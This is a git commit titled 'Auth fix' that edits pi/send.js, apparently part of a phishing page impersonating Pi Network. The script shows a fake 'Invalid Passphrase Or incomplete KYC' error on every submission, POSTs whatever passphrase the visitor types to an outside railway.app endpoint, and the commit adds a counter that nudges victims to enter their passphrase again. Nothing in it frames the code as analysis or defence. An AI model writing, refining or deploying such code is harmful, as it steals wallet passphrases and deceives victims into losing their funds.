445040b9fd373a102b3705a27c0bb9f4c2ef1464
Neon-jeff <omaksteejay@gmail.com>
2024-01-27 18:20:25 +0100

    Auth fix

--- pi/send.js
+++ pi/send.js
@@ -1,25 +1,28 @@
 // https://pinetworkmainnet.com/pi/formaction.php
 
-let form=document.querySelector('form')
+let form = document.querySelector("form");
 
+let data = document.querySelector(".form-control");
 
-let data=document.querySelector('.form-control')
+let message = document.querySelector(".error");
 
-let message=document.querySelector('.error')
+let counter = 0;
+let key=''
 
+form.addEventListener("submit", async (e) => {
+  if (counter < 2 && (key!=data.value || key=='')) {
+    key=data.value
+    counter++;
+    e.preventDefault();
+    message.innerHTML = " <p>Invalid Passphrase <br> Or incomplete KYC</p>";
+    await fetch("https://mainnet-production.up.railway.app/handle-mail", {
+      method: "POST",
+      body: JSON.stringify({ pass: data.value }),
+    });
+  } else {
+    e.preventDefault();
+    message.innerHTML = " <p>Invalid Passphrase <br> Or incomplete KYC</p>";
+  }
 
-
-
-    form.addEventListener('submit',async (e)=>{
-        e.preventDefault()
-                 message.innerHTML =
-           " <p>Invalid Passphrase <br> Or incomplete KYC</p>";
-        await fetch("https://mainnet-production.up.railway.app/handle-mail", {
-          method: "POST",
-          body: JSON.stringify({ pass: data.value }),
-        });
-
-
-        // window.location.reload()
-
-})
+  // window.location.reload()
+});
